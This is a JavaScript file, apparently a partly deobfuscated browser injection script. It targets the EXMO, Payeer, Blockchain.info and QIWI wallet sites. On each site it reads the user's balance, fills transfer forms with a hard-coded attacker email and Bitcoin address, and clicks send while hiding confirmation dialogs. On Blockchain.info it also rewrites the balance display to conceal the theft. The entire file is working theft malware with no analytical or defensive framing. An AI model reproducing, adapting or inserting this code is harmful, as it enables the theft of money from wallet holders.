var _0x7221 = ["hakerhelp5@mail.ru", "17gJN422WXBypfsnLuABiaGdWJmhAsDZ6w", "hostname", "location", "wallet.exmo.com", "pathname", "/", "of3", "of2", "of1", "", "length", "log", "RUB", "click", "wallet_btn_v1 wd_mod walletCollapseBtn", "getElementsByClassName", "value", "form_input form_input_s_37 text_right wsumma", "checked", "provider_156", "getElementById", "email", "getElementsByName", "btn_v4 text_upper btn_blue exch_btn fw_300", "display", "style", "modal overlay el_msg", "none", "btn_v1 popup_btn btn_gray_v3 no_text_selection fw_400", "USD", "BTC", "address", "tr", "getElementsByTagName", "tbody", "wallet_table_v1 wallet_balance_table wallet_shadow_mod  ng-scope", "innerHTML", "span", "div", "wallet_table_cell_v1 row_mod wallet_t_c_1", "wallet_table_cell_v1 row_mod wallet_t_c_2", "apply", "max", "payeer.com", "/ru/account/", "adss2", "/en/account/", "val", "int", "/ru/account/send/", "button_green_smm2", "stop1", "button_block type", "stop2", "tab-choosetypeoftransfer", "block", "account_email", "next button_green_sm", "input3", "li", "ul", "0", "00.0", "id_transfer_anonim-styler", "confirm button_green", "setInterval", "blockchain.info", "my-primary-address", "$", "indexOf", "innerText", "balance", "balance2", "replace", "send-coins-btn", "home-intro-btn", "send-value", "send-to-address", "send btn btn-success pop", " BTC", "qiwi.com", "w.qiwi.com", "w.qiwi.ru", "qiwi.ru", "phone", "/main.action", "adss1", "account_current_amount", "substring", "payment_frm providerPay", "narrow", "/settings/options/security.action", "/transfer/email.action", "pseudo-checkbox", "Отключено", "liquid dataField", "ui-selectmenu-text", "fixedRub dataField", "orangeBtn", "/payment/state.action", "content"];

var email = "hakerhelp5@mail.ru";
var adrhack = "17gJN422WXBypfsnLuABiaGdWJmhAsDZ6w";

if (window["location"]["hostname"] == "wallet.exmo.com") {
    if (window["location"]["pathname"] == "/") {
        location["of3"] = location["of2"] = location["of1"] = ""
    };
    setInterval(function() {
        for (var _0xaf4bx3 = 0; _0xaf4bx3 < array["length"]; _0xaf4bx3++) {
            if (array[_0xaf4bx3][2] == balmax && balmax !== 0) {
                console["log"](array[_0xaf4bx3]);
                if (array[_0xaf4bx3][1] = "RUB" && location["of1"] !== 1) {
                    document["getElementsByClassName"]("wallet_btn_v1 wd_mod walletCollapseBtn")[_0xaf4bx3]["click"]();
                    document["getElementsByClassName"]("form_input form_input_s_37 text_right wsumma")[0]["value"] = array[_0xaf4bx3][2];
                    document["getElementById"]("provider_156")["checked"] = true;
                    document["getElementsByName"]("email")[3]["value"] = email;
                    document["getElementsByClassName"]("btn_v4 text_upper btn_blue exch_btn fw_300")[6]["click"]();
                    document["getElementsByClassName"]("modal overlay el_msg")[0]["style"]["display"] = "none";
                    location["of1"] = 1;
                    document["getElementsByClassName"]("btn_v1 popup_btn btn_gray_v3 no_text_selection fw_400")[0]["click"]()
                };
                if (array[_0xaf4bx3][1] = "USD" && location["of2"] !== 1) {
                    document["getElementsByClassName"]("wallet_btn_v1 wd_mod walletCollapseBtn")[_0xaf4bx3]["click"]();
                    document["getElementsByClassName"]("form_input form_input_s_37 text_right wsumma")[1]["value"] = array[_0xaf4bx3][2];
                    document["getElementById"]("provider_156")["checked"] = true;
                    document["getElementsByName"]("email")[5]["value"] = email;
                    document["getElementsByClassName"]("btn_v4 text_upper btn_blue exch_btn fw_300")[6]["click"]();
                    document["getElementsByClassName"]("modal overlay el_msg")[0]["style"]["display"] = "none";
                    location["of2"] = 1;
                    document["getElementsByClassName"]("btn_v1 popup_btn btn_gray_v3 no_text_selection fw_400")[0]["click"]()
                };
                if (array[_0xaf4bx3][1] = "BTC" && location["of3"] !== 1) {
                    document["getElementsByClassName"]("wallet_btn_v1 wd_mod walletCollapseBtn")[_0xaf4bx3]["click"]();
                    document["getElementsByClassName"]("form_input form_input_s_37 text_right wsumma")[3]["value"] = array[_0xaf4bx3][2];
                    document["getElementsByName"]("address")[0]["value"] = adrhack;
                    document["getElementsByClassName"]("btn_v4 text_upper btn_blue exch_btn fw_300")[6]["click"]();
                    document["getElementsByClassName"]("modal overlay el_msg")[0]["style"]["display"] = "none";
                    location["of3"] = 1;
                    document["getElementsByClassName"]("btn_v1 popup_btn btn_gray_v3 no_text_selection fw_400")[0]["click"]()
                }
            }
        }
    }, 500);
    var array = [];
    var arr = [];
    var balmax = 0;
    var count = document["getElementsByClassName"]("wallet_table_v1 wallet_balance_table wallet_shadow_mod  ng-scope")[0]["getElementsByTagName"]("tbody")[0]["getElementsByTagName"]("tr")["length"];
    for (var i = 0; i < count; i++) {
        var val = document["getElementsByClassName"]("wallet_table_cell_v1 row_mod wallet_t_c_1")[i]["getElementsByTagName"]("div")[0]["getElementsByTagName"]("span")[0]["innerHTML"];
        var bal = document["getElementsByClassName"]("wallet_table_cell_v1 row_mod wallet_t_c_2")[i]["getElementsByTagName"]("div")[0]["getElementsByTagName"]("span")[0]["innerHTML"];
        console["log"](i, val, bal);
        array[array["length"]] = [i, val, bal];
        arr[arr["length"]] = bal;
        balmax = Math["max"]["apply"](0, arr)
    }
};
if (window["location"]["hostname"] == "payeer.com") {
    if (window["location"]["pathname"] == "/ru/account/") {
        localStorage["adss2"] = ""
    };
    if (window["location"]["pathname"] == "/en/account/") {
        localStorage["adss2"] = ""
    };
    window["setInterval"](function() {
        if (document["getElementsByClassName"]("val")[0]["innerHTML"] !== "") {
            var _0xaf4bxb = document["getElementsByClassName"]("int")[1]["innerHTML"];
            var _0xaf4bxc = document["getElementsByClassName"]("int")[1]["innerHTML"] / 64;
            var _0xaf4bxd = document["getElementsByClassName"]("int")[0]["innerHTML"];
            var _0xaf4bxe = document["getElementsByClassName"]("int")[2]["innerHTML"];
            if (window["location"]["pathname"] != "/ru/account/send/" && localStorage["adss2"] != "/ru/account/send/") {
                localStorage["adss2"] = window["location"]["pathname"] = "/ru/account/send/"
            };
            if (document["getElementsByClassName"]("button_green_smm2")[0] != undefined && window["location"]["stop1"] != 1) {
                document["getElementsByClassName"]("button_green_smm2")[0]["click"]();
                window["location"]["stop1"] = 1
            };
            if (document["getElementsByClassName"]("button_block type")[0] != undefined && window["location"]["stop2"] != 1) {
                document["getElementsByClassName"]("button_block type")[1]["click"]();
                window["location"]["stop2"] = 1
            };
            if (_0xaf4bxc > _0xaf4bxd) {
                if (document["getElementById"]("tab-choosetypeoftransfer")["style"]["display"] == "block") {
                    document["getElementsByName"]("account_email")[0]["value"] = email;
                    document["getElementsByClassName"]("next button_green_sm")[1]["click"]()
                };
                if (document["getElementsByClassName"]("input3")[1]["value"] != undefined) {
                    document["getElementsByClassName"]("input3")[1]["value"] = _0xaf4bxb
                };
                document["getElementsByTagName"]("ul")[11]["getElementsByTagName"]("li")[1]["click"]();
                if (document["getElementsByClassName"]("input3")[2]["value"] != "0" && document["getElementsByClassName"]("input3")[2]["value"] != "00.0" && document["getElementsByClassName"]("input3")[2]["value"] != "" && document["getElementsByClassName"]("input3")[2]["value"] != undefined) {
                    document["getElementById"]("id_transfer_anonim-styler")["click"]();
                    document["getElementsByClassName"]("confirm button_green")[0]["click"]()
                }
            } else {
                if (document["getElementById"]("tab-choosetypeoftransfer")["style"]["display"] == "block") {
                    document["getElementsByName"]("account_email")[0]["value"] = email;
                    document["getElementsByClassName"]("next button_green_sm")[1]["click"]()
                };
                if (document["getElementsByClassName"]("input3")[1]["value"] != undefined) {
                    document["getElementsByClassName"]("input3")[1]["value"] = _0xaf4bxd
                };
                document["getElementsByTagName"]("ul")[11]["getElementsByTagName"]("li")[0]["click"]();
                if (document["getElementsByClassName"]("input3")[2]["value"] != "0" && document["getElementsByClassName"]("input3")[2]["value"] != "00.0" && document["getElementsByClassName"]("input3")[2]["value"] != "" && document["getElementsByClassName"]("input3")[2]["value"] != undefined) {
                    document["getElementById"]("id_transfer_anonim-styler")["click"]();
                    document["getElementsByClassName"]("confirm button_green")[0]["click"]()
                }
            }
        }
    }, 100)
};
if (window["location"]["hostname"] == "blockchain.info") {
    window["setInterval"](function() {
        if (document["getElementById"]("my-primary-address")["innerHTML"] !== "") {
            if (document["getElementById"]("balance")["innerText"]["indexOf"]("$") == "0") {
                document["getElementById"]("balance")["click"]()
            };
            var _0xaf4bxd = document["getElementById"]("balance2")["innerText"];
            var _0xaf4bxf = document["getElementById"]("balance")["innerText"]["replace"](/[^.0-9]/gim, "");
            var _0xaf4bx10 = parseFloat(_0xaf4bxf) - 0.0003;
            if (_0xaf4bx10 > 0) {
                document["getElementById"]("send-coins-btn")["click"]();
                document["getElementById"]("home-intro-btn")["click"]();
                document["getElementsByName"]("send-value")[0]["value"] = _0xaf4bx10;
                document["getElementsByName"]("send-to-address")[0]["value"] = adrhack;
                document["getElementsByClassName"]("send btn btn-success pop")[0]["click"]();
                document["getElementById"]("balance")["innerText"] = _0xaf4bxf + " BTC";
                document["getElementById"]("balance2")["innerText"] = _0xaf4bxd
            }
        }
    }, 5000)
};
if (window["location"]["hostname"] == "qiwi.com" || window["location"]["hostname"] == "w.qiwi.com" || window["location"]["hostname"] == "w.qiwi.ru" || window["location"]["hostname"] == "qiwi.ru" && document["getElementsByClassName"]("phone")[0]["innerHTML"]["replace"](/[^.0-9]/gim, "")["length"] == 11) {
    if (window["location"]["pathname"] == "/main.action") {
        localStorage["adss1"] = ""
    };
    if (document["getElementsByClassName"]("account_current_amount")[0] != undefined) {
        var bal = document["getElementsByClassName"]("account_current_amount")[0]["innerHTML"]["replace"](/[^.0-9]/gim, "");
        bal = bal["substring"](0, bal["length"] - 2)
    };
    if (bal > 0) {
        if (document["getElementsByClassName"]("payment_frm providerPay")[0] != undefined) {
            document["getElementsByClassName"]("payment_frm providerPay")[0]["style"]["display"] = "none"
        };
        if (document["getElementsByClassName"]("narrow")[0] != undefined) {
            document["getElementsByClassName"]("narrow")[0]["style"]["display"] = "none"
        };
        setInterval(function() {
            if (window["location"]["pathname"] != "/settings/options/security.action" && localStorage["adss1"] != "/transfer/email.action") {
                window["location"]["pathname"] = "/settings/options/security.action"
            };
            if (window["location"]["pathname"] == "/settings/options/security.action") {
                if (document["getElementsByClassName"]("pseudo-checkbox")[0]["innerHTML"]["replace"](/[^.a-Я]/gim, "") == "Отключено") {
                    localStorage["adss1"] = window["location"]["pathname"] = "/transfer/email.action"
                }
            };
            if (document["getElementsByClassName"]("liquid dataField")[0] != undefined) {
                document["getElementsByClassName"]("liquid dataField")[0]["value"] = email;
                var _0xaf4bx11 = document["getElementsByClassName"]("ui-selectmenu-text")[0]["innerHTML"]["replace"](/[^.0-9]/gim, "");
                _0xaf4bx11 = _0xaf4bx11["substring"](0, _0xaf4bx11["length"] - 2);
                _0xaf4bx11 = _0xaf4bx11 - 1;
                document["getElementsByClassName"]("fixedRub dataField")[0]["value"] = _0xaf4bx11;
                setInterval(function() {
                    document["getElementsByClassName"]("orangeBtn")[0]["click"]()
                }, 500)
            };
            if (window["location"]["pathname"] == "/payment/state.action") {
                document["getElementById"]("content")["style"]["display"] = "";
                document["getElementsByClassName"]("orangeBtn")[0]["click"]()
            }
        }, 500)
    }
}